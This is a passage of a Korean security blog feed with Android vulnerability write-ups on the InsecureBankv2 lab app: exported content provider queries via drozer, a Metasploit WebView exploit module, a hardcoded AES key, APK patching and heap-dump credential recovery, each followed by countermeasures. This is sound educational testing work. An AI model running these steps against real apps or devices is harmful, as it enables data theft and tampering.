<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>인시큐어뱅크 애플리케이션에서는 <code>PostLogin.java</code>와 같이 루팅을 방지하는 소스 코드 로직이 그대로 노출되고 있습니다.</p>
<p>이를 방지하기 위하여 문자열 난독화를 적용하여 어떤 명령어와 루팅 관련 파일을 검사하는지 알 수 없게 해야합니다.</p>
<br>

<p>apk 파일을 조작하여 루팅을 유지하는 경우가 있을 수 있기 때문에 무결성 검증도 필요하고, 디컴파일의 위험성도 있기 때문에 디컴파일 방지 솔루션을 적용시키는게 좋습니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 안전하지 않은 콘텐츠 프로바이더 접근</title>
    <url>/2022/01/08/2022-01-08-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%88%EC%A0%84%ED%95%98%EC%A7%80%20%EC%95%8A%EC%9D%80%20%EC%BD%98%ED%85%90%EC%B8%A0%20%ED%94%84%EB%A1%9C%EB%B0%94%EC%9D%B4%EB%8D%94%20%EC%A0%91%EA%B7%BC/</url>
    <content><![CDATA[<h1 id="🤔-안전하지-않은-콘텐츠-프로바이더-접근"><a href="#🤔-안전하지-않은-콘텐츠-프로바이더-접근" class="headerlink" title="🤔  안전하지 않은 콘텐츠 프로바이더 접근?"></a>🤔  안전하지 않은 콘텐츠 프로바이더 접근?</h1><br>

<p>자신의 데이터에 다른 애플리케이션이 접근하거나 부여한 권한대로 이용할 수 있도록 하는 것이 프로바이더입니다.</p>
<p>이 기능을 사용하기 위해서는 프로바이더가 선언이 되어 있어야 합니다. 프로바이더는 <code>Androidmanifest.xml</code>의 <code>&lt;provider&gt;</code> 요소에 정의되어 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">&quot;.TrackUserContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:authorities</span>=<span class="string">&quot;com.android.insecurebankv2.TrackUserContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="콘텐츠-프로바이더-취약점-존재-여부-확인"><a href="#콘텐츠-프로바이더-취약점-존재-여부-확인" class="headerlink" title="콘텐츠 프로바이더 취약점 존재 여부 확인"></a>콘텐츠 프로바이더 취약점 존재 여부 확인</h2><br>

<blockquote>
<p>dz&gt; run app.package.attacksurface com.android.insecurebankv2</p>
</blockquote>
<br>

<p><code>drozer</code>로 콘텐츠 프로바이더 취약점이 존재하는지 확인해보았습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 콘텐츠 프로바이더 접근/attacksurface.png">

<br>

<p>1개의 콘텐츠 프로바이더 취약점이 있다고 나옵니다.</p>
<br>

<br>

<h2 id="콘텐츠-프로바이더-정보-확인"><a href="#콘텐츠-프로바이더-정보-확인" class="headerlink" title="콘텐츠 프로바이더 정보 확인"></a>콘텐츠 프로바이더 정보 확인</h2><br>

<blockquote>
<p>dz&gt; run app.provider.info -a com.android.insecurebankv2</p>
</blockquote>
<br>

<p><code>drozer</code>로 콘텐츠 프로바이더의 정보를 확인했습니다. <code>AndroidManifest.xml</code> 에 선언된 프로바이더와 동일합니다.</p>
<br>

<img src="/images/Android/안전하지 않은 콘텐츠 프로바이더 접근/info.png">

<br>

<br>

<h2 id="콘텐츠-프로바이더-URI-검색"><a href="#콘텐츠-프로바이더-URI-검색" class="headerlink" title="콘텐츠 프로바이더 URI 검색"></a>콘텐츠 프로바이더 URI 검색</h2><br>

<blockquote>
<p>dz&gt; run scanner.provider.finduris -a com.android.insecurebankv2</p>
</blockquote>
<br>

<p>콘텐츠 프로바이더에 접근하려면 콘텐츠 프로바이더의 <code>URI</code>이 필요합니다.</p>
<p><code>drozer</code>로 콘텐츠 프로바이더의 <code>URI</code>를 검색했습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 콘텐츠 프로바이더 접근/uri.png">

<br>

<p><code>content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers</code>를 통해 애플리케이션의 데이터를 조회할 수 있습니다.</p>
<br>

<br>

<h2 id="콘텐츠-프로바이더를-이용한-데이터-확인"><a href="#콘텐츠-프로바이더를-이용한-데이터-확인" class="headerlink" title="콘텐츠 프로바이더를 이용한 데이터 확인"></a>콘텐츠 프로바이더를 이용한 데이터 확인</h2><br>

<blockquote>
<p>dz&gt; run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers</p>
</blockquote>
<br>

<p>프로바이더 <code>URI</code>를 통해 데이터베이스의 정보를 가져왔습니다.</p>
<p>이를 이용해 <code>SQLi</code> 공격을 할 수 있습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 콘텐츠 프로바이더 접근/query.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p><code>AndroidManifest.xml</code> 파일에 프로바이더를 선언할 때 <code>exported</code>를 <code>false</code>로 설정해야합니다.</p>
<br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:name</span>=<span class="string">&quot;.TrackUserContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:authorities</span>=<span class="string">&quot;com.android.insecurebankv2.TrackUserContentProvider&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<img src="/images/Android/안전하지 않은 콘텐츠 프로바이더 접근/attacksurface_2.png">

<br>

<p>콘텐츠 프로바이더 취약점이 없다고 나옵니다.</p>
<br>

<br>

<img src="/images/Android/안전하지 않은 콘텐츠 프로바이더 접근/query_2.png">

<br>

<p>콘텐츠 프로바이더 <code>URI</code>로 접근한 결과, 권한이 없다는 메시지가 출력됩니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 안전하지 않은 웹 뷰 실행</title>
    <url>/2022/01/08/2022-01-08-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%88%EC%A0%84%ED%95%98%EC%A7%80%20%EC%95%8A%EC%9D%80%20%EC%9B%B9%20%EB%B7%B0%20%EC%8B%A4%ED%96%89/</url>
    <content><![CDATA[<h1 id="🤔-안전하지-않은-웹-뷰-실행"><a href="#🤔-안전하지-않은-웹-뷰-실행" class="headerlink" title="🤔  안전하지 않은 웹 뷰 실행?"></a>🤔  안전하지 않은 웹 뷰 실행?</h1><br>

<p>웹 뷰란 안드로이드에서 웹 브라우저에서 보이는 화면을 표시할 때 사용합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>AndroidManifest.xml</code> 파일에 인터넷 사용 권한이 존재합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<blockquote>
<p>칼리 버전 : Linux kali 5.15.0-kali2-amd64 #1 SMP Debian 5.15.5-2kali2 (2021-12-22) x86_64 GNU/Linux</p>
</blockquote>
<br>

<p>칼리에 있는 메타익스플로잇을 이용해 점검을 하겠습니다.</p>
<br>

<br>

<h2 id="메타익스플로잇-실행"><a href="#메타익스플로잇-실행" class="headerlink" title="메타익스플로잇 실행"></a>메타익스플로잇 실행</h2><br>

<blockquote>
<p># msfconsole</p>
</blockquote>
<br>

<img src="/images/Android/안전하지 않은 웹 뷰 실행/msf.png">

<br>

<p>메타익스플로잇을 실행시켜줍니다.</p>
<br>

<br>

<h2 id="웹-뷰-취약점-모듈-실행"><a href="#웹-뷰-취약점-모듈-실행" class="headerlink" title="웹 뷰 취약점 모듈 실행"></a>웹 뷰 취약점 모듈 실행</h2><br>

<blockquote>
<p>msf6 &gt; use exploit/android/browser/webview_addjavascriptinterface</p>
</blockquote>
<br>

<p>메타익스플로잇의 웹 뷰 취약점 모듈을 실행시켜줍니다.</p>
<br>

<img src="/images/Android/안전하지 않은 웹 뷰 실행/module.png">

<br>

<br>

<h2 id="웹-뷰-취약점-모듈-설정"><a href="#웹-뷰-취약점-모듈-설정" class="headerlink" title="웹 뷰 취약점 모듈 설정"></a>웹 뷰 취약점 모듈 설정</h2><br>

<blockquote>
<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; set LHOST 192.168.219.105</p>
</blockquote>
<blockquote>
<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; show options</p>
</blockquote>
<br>

<p><code>set LHOST IP</code> 명령어로 칼리 리눅스의 IP를 넣어줍니다.</p>
<p><code>show options</code> 명령어로 옵션들과 <code>set LHOST IP</code>로 넣어준 IP가 맞는지 확인해줍니다.</p>
<br>

<img src="/images/Android/안전하지 않은 웹 뷰 실행/set_ip.png">

<br>

<br>

<h2 id="URL-설정-amp-Exploit"><a href="#URL-설정-amp-Exploit" class="headerlink" title="URL 설정 &amp; Exploit"></a>URL 설정 &amp; Exploit</h2><br>

<blockquote>
<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; set URIPATH xitcsk</p>
</blockquote>
<blockquote>
<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; exploit</p>
</blockquote>
<br>

<p><code>set URIPATH xitcsk</code> 명령어로 공격에 사용할 <code>URL</code>을 설정했습니다.</p>
<p><code>exploit</code> 명령어로 공격을 실행해줍니다.</p>
<br>

<img src="/images/Android/안전하지 않은 웹 뷰 실행/exploit.png">

<br>

<br>

<h2 id="가상-디바이스에서-URL-접속"><a href="#가상-디바이스에서-URL-접속" class="headerlink" title="가상 디바이스에서 URL 접속"></a>가상 디바이스에서 URL 접속</h2><br>

<p>가상 디바이스인 <code>NOX</code>에서 칼리 리눅스에서 생성했던 <code>URL</code>로 접속합니다.</p>
<p><code>URL</code>에 접속해주면 칼리 리눅스에서 안드로이드 디바이스에 접근할 수 있습니다.</p>
<br>

<img src="/images/Android/안전하지 않은 웹 뷰 실행/connect_url.png">

<br>

<p>* 찾아보니 안드로이드 4.2 이하에서만 작동된다고 합니다. NOX 에서는 안드로이드 5 이상만 지원하기 때문에 실습이 불가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>해당 취약점의 경우 안드로이드 4.3 버전 이하 환경에서는 보안 패치를 중단했기 때문에 안드로이드 4.4 버전 이상을 사용해야 합니다.</p>
<br>

<p>웹 뷰를 구현할 때 웹 뷰 대신에 <code>HTML5 런타임 프레임워크 Crosswalk</code>를 사용해 주는 것도 방법입니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 취약한 암호화 실행</title>
    <url>/2022/01/09/2022-01-09-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%B7%A8%EC%95%BD%ED%95%9C%20%EC%95%94%ED%98%B8%ED%99%94%20%EC%8B%A4%ED%96%89/</url>
    <content><![CDATA[<h1 id="🤔-취약한-암호화-실행"><a href="#🤔-취약한-암호화-실행" class="headerlink" title="🤔  취약한 암호화 실행?"></a>🤔  취약한 암호화 실행?</h1><br>

<p>개발 단계에서 자주 발생하는 취약점으로 인코딩을 통해 민감한 데이터를 감추어 보내는 것 입니다.</p>
<p><code>Base64</code>와 같은 인코딩은 암호 알고리즘이 아니고 키 값을 가지고 있지 않기 때문에 얼마든지 인코딩 함수로 똑같은 데이터를 만들어 변조할 수 있기 때문입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<h2 id="LoginActivity-java"><a href="#LoginActivity-java" class="headerlink" title="LoginActivity.java"></a>LoginActivity.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* LoginActivity.java 일부 */</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">fillData</span><span class="params">()</span> <span class="keyword">throws</span> UnsupportedEncodingException, InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		SharedPreferences settings = getSharedPreferences(MYPREFS, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">final</span> String username = settings.getString(<span class="string">&quot;EncryptedUsername&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">final</span> String password = settings.getString(<span class="string">&quot;superSecurePassword&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(username!=<span class="keyword">null</span> &amp;&amp; password!=<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                usernameBase64ByteString = <span class="keyword">new</span> String(usernameBase64Byte, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            Username_Text = (EditText) findViewById(R.id.loginscreen_username);</span><br><span class="line">            Password_Text = (EditText) findViewById(R.id.loginscreen_password);</span><br><span class="line">            Username_Text.setText(usernameBase64ByteString);</span><br><span class="line">            CryptoClass crypt = <span class="keyword">new</span> CryptoClass();</span><br><span class="line">            String decryptedPassword = crypt.aesDeccryptedString(password);</span><br><span class="line">            Password_Text.setText(decryptedPassword);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (username==<span class="keyword">null</span> || password==<span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">//  Toast.makeText(this, &quot;No stored credentials found!!&quot;, Toast.LENGTH_LONG).show();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">//  Toast.makeText(this, &quot;No stored credentials found!!&quot;, Toast.LENGTH_LONG).show();</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>아이디는 <code>Base64</code>로 인코딩을하고, 비밀번호는 <code>AES</code>로 암호화하고 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="CryptoClass-java"><a href="#CryptoClass-java" class="headerlink" title="CryptoClass.java"></a>CryptoClass.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* CryptoClass.java 일부 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CryptoClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	The super secret key used by the encryption function</span></span><br><span class="line">	String key = <span class="string">&quot;This is the super secret key 123&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//	The initialization vector used by the encryption function</span></span><br><span class="line">	<span class="keyword">byte</span>[] ivBytes = &#123;</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line">	String plainText;</span><br><span class="line">	<span class="keyword">byte</span>[] cipherData;</span><br><span class="line">	String base64Text;</span><br><span class="line">	String cipherText;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p><code>AES</code>에 사용되는 키를 그대로 노출 시키고 있습니다.</p>
<p>이 키 값으로 비밀번호를 복호화 할 수 있기 때문에 취약합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>대응 방안은 아래와 같습니다.</p>
<br>

<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>취약한 인증 메커니즘</p><p>Koun9Hwan</p>
<a href="https://koun9hwan.github.io/2022/01/06/2022-01-06-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EB%A1%9C%EC%BB%AC%20%EC%95%94%ED%98%B8%ED%99%94%20%EC%9D%B4%EC%8A%88/#%F0%9F%94%92-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"></a>
</div></div>

<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 애플리케이션 패칭</title>
    <url>/2022/01/09/2022-01-09-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98%20%ED%8C%A8%EC%B9%AD/</url>
    <content><![CDATA[<h1 id="🤔-애플리케이션-패칭"><a href="#🤔-애플리케이션-패칭" class="headerlink" title="🤔  애플리케이션 패칭?"></a>🤔  애플리케이션 패칭?</h1><br>

<p>정상적인 애플리케이션을 변조하고 배포하여 사용자들의 정보를 탈취 · 악성코드 유포하는 것을 말합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<h2 id="PostLogin-java"><a href="#PostLogin-java" class="headerlink" title="PostLogin.java"></a>PostLogin.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* PostLogin.java 일부 */</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">showRootStatus</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> isrooted = doesSuperuserApkExist(<span class="string">&quot;/system/app/Superuser.apk&quot;</span>)||</span><br><span class="line">                doesSUexist();</span><br><span class="line">        <span class="keyword">if</span>(isrooted==<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            root_status.setText(<span class="string">&quot;Rooted Device!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            root_status.setText(<span class="string">&quot;Device not Rooted!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<br>

<p><code>PostLogin.java</code>에서 루팅했을때 나오는 문구를 수정해서 앱을 변조해보겠습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="PostLogin-java-1"><a href="#PostLogin-java-1" class="headerlink" title="PostLogin.java"></a>PostLogin.java</h2><br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* PostLogin.java 일부 */</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">showRootStatus</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> isrooted = doesSuperuserApkExist(<span class="string">&quot;/system/app/Superuser.apk&quot;</span>)||</span><br><span class="line">                doesSUexist();</span><br><span class="line">        <span class="keyword">if</span>(isrooted==<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            root_status.setText(<span class="string">&quot;KH&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            root_status.setText(<span class="string">&quot;Device not Rooted!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<br>

<p>루팅했을 때 나오는 문구를 기존의 <code>Rooted Device!!</code>에서 <code>KH</code>으로 바꾸었습니다.</p>
<br>

<br>

<h2 id="NOX-확인"><a href="#NOX-확인" class="headerlink" title="NOX 확인"></a>NOX 확인</h2><br>

<p>문구가 바뀐것을 확인할 수 있습니다.</p>
<br>

<img src="/images/Android/애플리케이션 패칭/change_kh.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>소스 코드 난독화를 하여 분석을 어렵게 해야합니다.</p>
<p>안드로이드 스튜디오에서는 기본적으로 앱 난독화 도구 <code>프로가드</code>를 제공하고있습니다. 그 외에도 <code>DashOPro</code> <code>Allatori</code> <code>DexGuard</code>와 같은 오픈소스 난독화 도구가 있습니다.</p>
<br>

<p>또한 여러개의 보안 솔루션을 도입하여 방어해야합니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 메모리 내 민감한 정보 저장</title>
    <url>/2022/01/10/2022-01-10-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EB%A9%94%EB%AA%A8%EB%A6%AC%20%EB%82%B4%20%EB%AF%BC%EA%B0%90%ED%95%9C%20%EC%A0%95%EB%B3%B4%20%EC%A0%80%EC%9E%A5/</url>
    <content><![CDATA[<h1 id="🤔-메모리-내-민감한-정보-저장"><a href="#🤔-메모리-내-민감한-정보-저장" class="headerlink" title="🤔  메모리 내 민감한 정보 저장?"></a>🤔  메모리 내 민감한 정보 저장?</h1><br>

<p>애플리케이션이 실행이 되면 일정량의 메모리를 사용하고 필요한 정보들이 저장됩니다.</p>
<p>메모리(RAM)은 휘발성이기 때문에 애플리케이션을 종료시키면 메모리에 저장된 데이터들이 삭제됩니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<p>메모리 안에 있는 데이터를 얻기 위해서는 <code>메모리 포렌식</code>을 해야합니다.</p>
<p><code>메모리 포렌식</code>을 통해 획득 가능한 정보는 <code>프로세스</code> <code>스레드 정보</code> <code>모듈</code> <code>라이브러리 정보</code> 등이 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<h2 id="PID-확인"><a href="#PID-확인" class="headerlink" title="PID 확인"></a>PID 확인</h2><br>

<blockquote>
<p># ps | grep inse</p>
</blockquote>
<br>

<p>현재 실행중인 인시큐어뱅크의 PID를 확인해줍니다.</p>
<br>

<img src="/images/Android/메모리 내 민감한 정보 저장/ps.png">

<br>

<br>

<h2 id="메모리-정보-추출"><a href="#메모리-정보-추출" class="headerlink" title="메모리 정보 추출"></a>메모리 정보 추출</h2><br>

<blockquote>
<p>adb shell am dumpheap 17647 /data/local/tmp/insecurebank</p>
</blockquote>
<br>

<p>adb 명령어로 메모리 정보를 추출해줍니다.</p>
<br>

<img src="/images/Android/메모리 내 민감한 정보 저장/dump.png">

<br>

<br>

<h2 id="저장된-메모리-정보-로컬로-가져오기"><a href="#저장된-메모리-정보-로컬로-가져오기" class="headerlink" title="저장된 메모리 정보 로컬로 가져오기"></a>저장된 메모리 정보 로컬로 가져오기</h2><br>

<blockquote>
<p>adb pull /data/local/tmp/insecurebank D:\dump</p>
</blockquote>
<br>

<p>adb 명령어로 추출된 메모리 덤프를 로컬로 가져와줍니다.</p>
<br>

<img src="/images/Android/메모리 내 민감한 정보 저장/pull.png">

<br>

<br>

<h2 id="hprof-conv를-이용한-포맷-변경"><a href="#hprof-conv를-이용한-포맷-변경" class="headerlink" title="hprof-conv를 이용한 포맷 변경"></a>hprof-conv를 이용한 포맷 변경</h2><br>

<blockquote>
<p>hprof-conv.exe D:\dump\insecurebank D:\dump\insecurebank_2</p>
</blockquote>
<br>

<p><code>hprof-conv.exe</code>가 있는 경로로 가서 <code>MAT</code>에서 분석할 수 있도록 포맷을 변경해줍니다.</p>
<br>

<img src="/images/Android/메모리 내 민감한 정보 저장/hprof.png">

<br>

<br>

<h2 id="정보-확인"><a href="#정보-확인" class="headerlink" title="정보 확인"></a>정보 확인</h2><br>

<p><code>HxD</code> 프로그램을 사용하여 메모리 덤프 파일을 분석해줍니다.</p>
<br>

<img src="/images/Android/메모리 내 민감한 정보 저장/hxd.png">

<br>

<p>메모리 덤프 파일에 아이디와 비밀번호가 평문으로 남아있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<p>민감한 정보를 저장하고 싶을 때에는 메모리에 저장하는것보다 안전한 키로 암호화하여 서버에 저장하는것이 좋습니다.</p>
<br>

<p>금융권 애플리케이션같은 경우 서버 간의 종단 간 암호화(E2E)를 권고하고 있습니다.</p>
<p>E2E는 입력되는 순간부터 암호화되어 서버까지 암호화된 상태를 유지하는 것을 말합니다. 공격자가 중간에 메모리를 가로채더라도 암호화상태라서 안전합니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-24 NFS 서비스 비활성화</title>
